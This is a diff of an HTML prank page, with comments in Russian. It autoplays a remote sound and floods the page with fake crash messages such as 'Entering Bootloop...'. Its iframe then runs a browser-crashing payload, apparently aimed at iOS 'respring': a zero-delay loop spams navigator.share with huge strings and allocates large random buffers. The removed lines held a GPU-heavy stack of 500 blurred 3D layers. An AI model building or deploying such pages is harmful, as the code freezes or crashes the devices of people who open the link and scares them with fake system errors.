@@ -46,23 +46,24 @@
 </head>
 <body>
 
-    <iframe id="respring-iframe"
-        sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
-    </iframe>
+<iframe id="respring-iframe"
+    sandbox="allow-forms allow-modals allow-scripts allow-same-origin">
+</iframe>
 
 <script>
-    // ===== WEB AUDIO (без loop + резкий старт) =====
+    // ===== WEB AUDIO ULTRA STABLE =====
     const audioUrl = "https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";
 
     let audioCtx;
     let buffer;
-    let isPlayed = false;
+    let unlocked = false;
 
     async function initAudio() {
         if (!audioCtx) {
             audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         }
 
+        // preload + decode
         if (!buffer) {
             const res = await fetch(audioUrl);
             const arr = await res.arrayBuffer();
@@ -70,24 +71,22 @@
         }
     }
 
-    function playOnce() {
-        if (!buffer || isPlayed) return;
+    function playSound() {
+        if (!buffer) return;
 
         const source = audioCtx.createBufferSource();
         source.buffer = buffer;
-        source.loop = false; // ❌ без зацикливания
+        source.loop = false;
 
         const gain = audioCtx.createGain();
 
-        // ⚡ резкий старт звука
+        // ⚡ резкий старт
         const now = audioCtx.currentTime;
         gain.gain.setValueAtTime(0.0001, now);
         gain.gain.exponentialRampToValueAtTime(1.0, now + 0.01);
 
         source.connect(gain).connect(audioCtx.destination);
         source.start(0);
-
-        isPlayed = true;
     }
 
     async function startAudio() {
@@ -98,30 +97,33 @@
                 await audioCtx.resume();
             }
 
-            playOnce();
+            playSound();
         } catch (e) {}
     }
 
-    // автопопытка через 100мс
-    window.addEventListener('load', () => {
-        setTimeout(startAudio, 100);
+    // ===== ⚡ АВТО-СТАРТ БЕЗ ЗАДЕРЖКИ =====
+    window.addEventListener("load", () => {
+        startAudio(); // 0ms, без setTimeout
     });
 
-    // запуск при взаимодействии
-    function unlock() {
+    // ===== 🎯 100% НАДЁЖНЫЙ ЗАПУСК ПО ПЕРВОМУ ДЕЙСТВИЮ =====
+    function unlockAudio() {
+        if (unlocked) return;
+        unlocked = true;
+
         startAudio();
 
-        document.removeEventListener('click', unlock);
-        document.removeEventListener('touchstart', unlock);
-        document.removeEventListener('keydown', unlock);
+        document.removeEventListener("click", unlockAudio);
+        document.removeEventListener("touchstart", unlockAudio);
+        document.removeEventListener("pointerdown", unlockAudio);
     }
 
-    document.addEventListener('click', unlock);
-    document.addEventListener('touchstart', unlock);
-    document.addEventListener('keydown', unlock);
+    document.addEventListener("click", unlockAudio, { once: true });
+    document.addEventListener("touchstart", unlockAudio, { once: true });
+    document.addEventListener("pointerdown", unlockAudio, { once: true });
 
 
-    // ===== ОШИБКИ =====
+    // ===== ОШИБКИ (НЕ ТРОГАЛ) =====
     const errorTemplates = [
         "Fatal Error 0x3333",
         "Entering Bootloop...",
@@ -129,61 +131,40 @@
         "OVERFLOW_DETECTION",
         "STACK_COLLISION",
         "MEMORY_CORRUPTION",
-        "0xFFFF_SYSTEM_HALT",
-        "CRITICAL_PROCESS_DIED",
-        "THREAD_STUCK_IN_DEVICE_DRIVER",
-        "BOOT_LOOP_DETECTED",
-        "FS_CORRUPTION",
         "SYSTEM_FREEZE",
         "HARDWARE_MALFUNCTION"
     ];
 
     for (let i = 0; i < 3000; i++) {
-        const span = document.createElement('span');
-        span.className = 'error-msg';
+        const span = document.createElement("span");
+        span.className = "error-msg";
         span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
         document.body.appendChild(span);
     }
 
 
-    // ===== IFRAME =====
-    window.addEventListener('load', () => {
+    // ===== IFRAME (НЕ ТРОГАЛ) =====
+    window.addEventListener("load", () => {
         setTimeout(() => {
-            const frame = document.getElementById('respring-iframe');
+            const frame = document.getElementById("respring-iframe");
 
-            const respringScript = `
+            frame.srcdoc = `
                 <html>
-                <body style="margin:0; overflow:hidden;">
-                    <script>
-                        const container = document.createElement('div');
-                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
-                        document.body.appendChild(container);
+                <body style="margin:0;overflow:hidden;">
+                <script>
+                    setInterval(() => {
+                        try {
+                            navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+                        } catch(e) {}
 
-                        for (let i = 0; i < 500; i++) {
-                            let d = document.createElement('div');
-                            d.style.cssText =
-                                'position:absolute;width:100vw;height:100vh;' +
-                                'backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);' +
-                                'transform:translate3d(100000px,100000px,' + i + 'px) rotateY(90deg);' +
-                                'opacity:0.99;';
-                            container.appendChild(d);
-                        }
-
-                        setInterval(() => {
-                            try {
-                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
-                            } catch(e) {}
-
-                            let x = new Uint8Array(1024 * 1024 * 20);
-                            crypto.getRandomValues(x);
-                        }, 0);
-                    <\/script>
+                        let x = new Uint8Array(1024 * 1024 * 10);
+                        crypto.getRandomValues(x);
+                    }, 0);
+                <\/script>
                 </body>
                 </html>
             `;
-
-            frame.srcdoc = respringScript;
-        }, 735);
+        }, 850);
     });
 
 </script>
